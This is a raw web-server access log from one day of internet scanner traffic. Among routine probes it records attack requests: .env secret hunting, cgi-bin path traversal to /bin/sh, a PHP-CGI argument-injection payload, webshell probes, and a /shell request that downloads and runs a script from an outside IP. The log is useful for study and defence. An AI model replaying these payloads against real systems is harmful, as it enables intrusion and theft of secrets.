154.213.187.122 - - [06/Jan/2025:00:03:07 +0000] "GET /login.rsp HTTP/1.1" 302 350 "-" "Hello World"
223.167.168.109 - - [06/Jan/2025:02:27:56 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
111.224.221.239 - - [06/Jan/2025:02:27:57 +0000] "GET / HTTP/1.1" 200 1761 "http://35.243.94.80/favicon.ico" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
195.3.223.55 - - [06/Jan/2025:02:35:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
61.220.241.10 - - [06/Jan/2025:02:38:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [06/Jan/2025:02:52:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
37.116.163.237 - - [06/Jan/2025:03:13:29 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [06/Jan/2025:03:24:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [06/Jan/2025:03:28:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:03:28:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
211.199.108.37 - - [06/Jan/2025:04:00:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
18.191.32.67 - - [06/Jan/2025:04:16:55 +0000] "\x16\x03\x01" 400 527 "-" "-"
18.191.32.67 - - [06/Jan/2025:04:18:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
195.3.223.55 - - [06/Jan/2025:04:25:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
147.185.132.91 - - [06/Jan/2025:04:27:14 +0000] "\x16\x03\x01" 400 527 "-" "-"
147.185.132.91 - - [06/Jan/2025:04:27:14 +0000] "\x16\x03\x01" 400 527 "-" "-"
13.57.3.52 - - [06/Jan/2025:04:30:21 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
61.78.182.191 - - [06/Jan/2025:04:48:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [06/Jan/2025:04:50:30 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:04:50:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
130.211.108.229 - - [06/Jan/2025:05:07:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
195.3.223.55 - - [06/Jan/2025:05:14:55 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
197.202.122.107 - - [06/Jan/2025:05:14:55 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.34.212.75 - - [06/Jan/2025:05:20:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
154.213.184.132 - - [06/Jan/2025:05:20:46 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
74.121.148.226 - - [06/Jan/2025:05:27:32 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
74.121.148.226 - - [06/Jan/2025:05:27:36 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
74.121.148.226 - - [06/Jan/2025:05:27:45 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
49.51.178.45 - - [06/Jan/2025:06:01:55 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
78.153.140.149 - - [06/Jan/2025:06:07:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:06:07:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [06/Jan/2025:06:28:57 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
159.89.118.87 - - [06/Jan/2025:06:39:53 +0000] "\x16\x03\x01" 400 527 "-" "-"
159.89.118.87 - - [06/Jan/2025:06:39:53 +0000] "\x16\x03\x01" 400 527 "-" "-"
159.89.118.87 - - [06/Jan/2025:06:39:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [06/Jan/2025:06:39:53 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
159.89.118.87 - - [06/Jan/2025:06:39:54 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
159.89.118.87 - - [06/Jan/2025:06:39:54 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
159.89.118.87 - - [06/Jan/2025:06:39:54 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [06/Jan/2025:06:39:55 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [06/Jan/2025:06:39:55 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [06/Jan/2025:06:39:55 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [06/Jan/2025:06:39:56 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
5.181.190.248 - - [06/Jan/2025:06:59:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
35.203.211.210 - - [06/Jan/2025:07:06:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.149 - - [06/Jan/2025:07:08:46 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:07:08:46 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.187.235.243 - - [06/Jan/2025:07:15:15 +0000] "GET /shell?cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/194.37.81.64/random.sh;chmod+777+random.sh;./random.sh HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
71.6.232.23 - - [06/Jan/2025:07:53:10 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
46.19.138.234 - - [06/Jan/2025:07:56:41 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
207.90.244.2 - - [06/Jan/2025:08:02:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
207.90.244.2 - - [06/Jan/2025:08:02:17 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "-"
207.90.244.2 - - [06/Jan/2025:08:02:17 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "-"
207.90.244.2 - - [06/Jan/2025:08:02:18 +0000] "GET /.well-known/security.txt HTTP/1.1" 302 331 "-" "-"
207.90.244.2 - - [06/Jan/2025:08:02:18 +0000] "GET /favicon.ico HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
87.120.115.119 - - [06/Jan/2025:08:02:38 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; LG-H930) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
193.34.212.75 - - [06/Jan/2025:08:03:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
154.213.184.132 - - [06/Jan/2025:08:16:19 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
211.222.75.66 - - [06/Jan/2025:08:20:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.134.225.136 - - [06/Jan/2025:08:27:22 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.149 - - [06/Jan/2025:08:35:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:08:35:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
64.62.197.143 - - [06/Jan/2025:08:42:22 +0000] "\x16\x03\x01" 400 527 "-" "-"
195.3.223.55 - - [06/Jan/2025:08:57:39 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
112.159.90.5 - - [06/Jan/2025:09:06:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
175.197.99.143 - - [06/Jan/2025:09:24:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.186.238.37 - - [06/Jan/2025:09:32:42 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"
175.205.1.49 - - [06/Jan/2025:09:47:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [06/Jan/2025:10:00:51 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:10:00:52 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
175.201.146.133 - - [06/Jan/2025:10:13:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
60.50.205.12 - - [06/Jan/2025:10:30:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
220.77.19.169 - - [06/Jan/2025:10:44:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
159.223.67.34 - - [06/Jan/2025:11:00:55 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [06/Jan/2025:11:01:03 +0000] "\x16\x03\x01\x01\v\x01" 400 527 "-" "-"
89.248.163.100 - - [06/Jan/2025:11:24:30 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
20.173.66.120 - - [06/Jan/2025:11:44:20 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.173.66.120 - - [06/Jan/2025:11:44:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
78.153.140.149 - - [06/Jan/2025:12:03:20 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:12:03:21 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
121.129.26.63 - - [06/Jan/2025:12:20:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
91.223.3.201 - - [06/Jan/2025:12:26:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.213.184.132 - - [06/Jan/2025:12:29:49 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
35.202.129.1 - - [06/Jan/2025:12:42:47 +0000] "\x16\x03\x01" 400 527 "-" "-"
35.202.129.1 - - [06/Jan/2025:12:42:49 +0000] "OPTIONS / HTTP/1.0" 200 1761 "-" "-"
179.43.191.146 - - [06/Jan/2025:12:58:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
183.104.240.170 - - [06/Jan/2025:13:07:50 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
64.62.156.64 - - [06/Jan/2025:13:08:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
139.59.101.104 - - [06/Jan/2025:13:08:24 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
64.62.156.54 - - [06/Jan/2025:13:10:30 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
64.62.156.58 - - [06/Jan/2025:13:11:12 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
220.125.10.48 - - [06/Jan/2025:13:24:53 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.3.223.55 - - [06/Jan/2025:13:28:57 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [06/Jan/2025:13:41:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:13:41:01 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
43.153.7.191 - - [06/Jan/2025:13:41:09 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
34.77.141.61 - - [06/Jan/2025:13:52:45 +0000] "\x16\x03\x01" 400 527 "-" "-"
34.77.141.61 - - [06/Jan/2025:13:52:48 +0000] "OPTIONS / HTTP/1.0" 200 1761 "-" "-"
46.19.138.234 - - [06/Jan/2025:13:57:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [06/Jan/2025:14:04:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:14:04:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [06/Jan/2025:14:20:48 +0000] "\x16\x03\x02\x01o\x01" 400 527 "-" "-"
185.242.226.10 - - [06/Jan/2025:14:38:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
178.215.236.132 - - [06/Jan/2025:14:40:53 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 OPR/62.0.3331.116 (Edition Campaign 34)"
5.181.190.248 - - [06/Jan/2025:14:46:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
222.228.104.244 - - [06/Jan/2025:14:47:56 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
93.174.93.12 - - [06/Jan/2025:15:13:51 +0000] "\x16\x03\x02\x01o\x01" 400 527 "-" "-"
118.193.56.171 - - [06/Jan/2025:15:26:27 +0000] "\x16\x03\x01\x01\x17\x01" 400 527 "-" "-"
118.193.56.171 - - [06/Jan/2025:15:26:37 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
118.193.56.171 - - [06/Jan/2025:15:26:43 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.56.171 - - [06/Jan/2025:15:26:43 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.56.171 - - [06/Jan/2025:15:26:43 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.56.171 - - [06/Jan/2025:15:26:43 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/robots.txt" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.56.171 - - [06/Jan/2025:15:26:44 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.56.171 - - [06/Jan/2025:15:26:44 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/sitemap.xml" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.56.171 - - [06/Jan/2025:15:26:44 +0000] "GET /js/brand.js HTTP/1.1" 200 514 "-" "Go-http-client/1.1"
118.193.56.171 - - [06/Jan/2025:15:26:44 +0000] "GET /js/login.js HTTP/1.1" 200 866 "-" "Go-http-client/1.1"
118.193.56.171 - - [06/Jan/2025:15:26:44 +0000] "GET /config.json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
::1 - - [06/Jan/2025:15:26:49 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
87.120.127.198 - - [06/Jan/2025:15:29:40 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/4.0 (compatible; Dillo 3.0)"
139.59.101.104 - - [06/Jan/2025:15:41:44 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.149 - - [06/Jan/2025:15:44:28 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:15:44:29 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
154.213.184.132 - - [06/Jan/2025:16:51:27 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
